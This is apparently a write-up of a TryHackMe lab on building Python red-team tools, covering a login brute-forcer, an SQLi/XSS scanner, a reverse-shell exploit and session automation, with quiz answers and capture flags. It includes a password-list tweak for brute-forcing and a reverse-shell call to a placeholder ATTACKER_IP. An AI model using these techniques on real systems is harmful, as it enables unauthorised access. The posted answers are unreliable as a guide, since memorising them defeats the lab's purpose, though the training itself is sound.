---
title: 'TryHackMe: Custom Tooling Using Python'
author: Hui_0_07
categories: [TryHackMe]
tags: [Red Teaming, Python, Custom Tools, Brute-Forcing, Web Security, SQLi, XSS, Exploit Development, Automation]
render_with_liquid: false
media_subpath: /images/Custom_Tooling_Using_Python/
image:
  path: intro.webp
---

This TryHackMe room is a **hands-on training module** focused on teaching red teamers how to build **custom tools and exploits using Python**. Designed for offensive security professionals, the room walks learners through scripting their own brute-force tools, vulnerability scanners, and automated exploits for web applications. Emphasis is placed on **code-driven automation**, **OpSec considerations**, and **practical use cases**, making it ideal for those preparing for real-world red teaming engagements or sharpening their Python offensive capabilities. Each task reinforces key skills through interactive challenges and flags.
  
> Some answers have been **REDACTED** to encourage hands-on practice.
{: .prompt-warning}

*[Image: Tryhackme Room Link]*{: width="600" height="150" .shadow }
_<https://tryhackme.com/room/customtoolingpython>_

## Task 1: Introduction

Custom tooling is crucial in web application red teaming, as off-the-shelf tools rarely meet specific needs. This room focuses on using Python to build tailored tools and exploits: like scanners, brute-forcer, and RCE payloads: while covering key OpSec considerations. The coding concepts apply broadly across languages.

### Learning Objectives
- Learn how code can be used to develop custom tools and exploits  
- Understand how to choose the right language for your tooling needs  
- Create Python-based custom tools and exploits  
- Build a web scanner, brute-force tool, and automated RCE exploit  
- Understand operational security (OpSec) while writing custom tooling

### Prerequisites
- Basic knowledge of Python  
- Experience with Python for pentesting

Start the attached machine using the **Start Machine** button. You can use the TryHackMe AttackBox or your own VM connected to the VPN.

Add the following entry to your `/etc/hosts` file:

>Use ```echo "MACHINE_IP python.thm" >> /etc/hosts``` in the Terminal.
{: .prompt-tip }

> ### ✅ Answer 1
> **Q: I am ready to use code to create custom tooling and exploits!**  
> **Ans: No Answer needed**

## Task 2: Using a Coding Language for Custom Tooling

### Why Create Your Own Tools?
Using prebuilt tools in red teaming may not always meet specific needs and can be easily detected. Custom tooling allows you to:
- Tailor tools to your requirements
- Automate exploits and repetitive tasks
- Bypass detection mechanisms
- Modify existing tools and exploits

Python is widely used for building custom security tools due to its:
- Fast prototyping and development
- Extensive libraries for networking, web interaction, and automation
- Simple syntax and strong community support
- Cross-platform compatibility

While Python is ideal for rapid development, compiled languages like Go and .NET offer better stealth and performance.

> ### ✅ Answer 1  
> **Q: Does a scripting language perform better than a compiled language?**  
> **Ans: Nay**

> ### ✅ Answer 2  
> **Q: Which compiled language is easy to cross-compile?**  
> **Ans: Go**

> ### ✅ Answer 3  
> **Q: Which scripting language is best suited for web-based exploits?**  
> **Ans: Javascript**

## Task 3: Developing a Brute-Forcing Tool

In this task, we focus on developing a brute-forcing tool using Python for bypassing authentication. Brute-force attacks work by trying multiple username and password combinations until the correct credentials are found. While these attacks are often mitigated by rate limiting and account lockouts, they remain effective. We will utilize the `requests` library for HTTP requests and handle responses based on HTTP status codes, redirects, or patterns to determine valid logins.

### Essential Commands:
- **Requests library**: To send HTTP requests and analyze responses.
- **String library**: For password generation and manipulation.

> ### ✅ Answer 1  
> **Q: What is one of the renowned Python libraries used to send HTTP requests, interact with web applications, and analyze responses?**  
> **Ans: requests**

> ### ✅ Answer 2  
> **Q: What is the flag value after logging in as admin?**  
> **Ans: THM{Brute_Force_Success007}**

> ### ✅ Answer 3  
> **Q: Can you attempt to log in as Mark, whose password follows a specific pattern? His password consists of the first three characters as digits (000-999) followed by a single uppercase letter (A-Z). What is the flag value?**  
> **Ans: THM{Brute_Force_[REDACTED]}** 

> Change the `password_list = [str(i).zfill(4) for i in range(10000)]` to `password_list = [str(i).zfill(3) + char for i in range(1000) for char in string.ascii_uppercase]`.
{: .prompt-info}

## Task 4: Developing a Vulnerability Scanner

In this task, we will build a vulnerability scanner to detect common web application flaws such as SQL injection (SQLi) and Cross-Site Scripting (XSS). We'll use Python to automate the scanning process and identify vulnerabilities in a web app by sending various payloads and checking the responses.

### Essential Commands:
- **Regular Expressions (re)**: Used for pattern matching in web app responses.
- **Threading**: Helps speed up the scanning process by sending multiple requests simultaneously.

> ### ✅ Answer 1  
> **Q: How many vulnerabilities will be identified if we use the above scanner.py script with the updated URL `http://python.thm/labs/lab2/departments.php?name=?` (without changing the original code)?**  
> **Ans: 0**

> ### ✅ Answer 2  
> **Q: After tweaking the above script to use the appropriate GET parameter, how many payloads are found? (with changing the original code)**  
> **Ans: 2**

> ### ✅ Answer 3  
> **Q: Which of the following is the valid type of vulnerability?**  
> **Ans: b) SQL injection**

> ### ✅ Answer 4  
> **Q: What is the name of the renowned library that is used to make concurrent requests to an endpoint?**  
> **Ans: Threading**

## Task 5: Creating a Basic Exploit

In this task, we will create a basic exploit using Python. Exploits such as reverse shells (revshells) and remote code execution (RCE) are commonly used techniques for gaining unauthorized access to systems. The task focuses on applying these concepts in a controlled environment to understand their execution flow.

> ### ✅ Answer 1  
> **Q: What is the flag value?**  
> **Ans: THM{basic_[REDACTED]_python}**

## Task 6: Task Automation

Automating session management is an important technique in web application penetration testing. By using Python’s `requests.Session()` class, you can automate the handling of session cookies, making it easier to perform multiple requests without manually re-authenticating each time. This session automation ensures persistence across requests, even if the session expires, and simplifies reproducing exploits.

> ### ✅ Answer 1  
> **Q: What is the flag?**  
> **Ans: THM{6470e39[REDACTED]8585059b}**

> Use your Attacking Machine's IP in ```get_reverse_shell(session, "ATTACKER_IP", 4444)```. If using AttackBox, provide the AttackBox IP.
{: .prompt-info}

## Task 7: The Power of Code

Coding is a powerful tool in red teaming, enabling you to automate functions, stage attacks, gain system access, and enhance efficiency. While Python is a popular choice, exploring other languages, particularly compiled ones, can provide additional benefits. The ability to write or modify code is vital in the red teaming process.

> ### ✅ Answer 1  
> **Q: I understand the importance of using code to develop custom tooling.**  
> **Ans: No Answer needed**
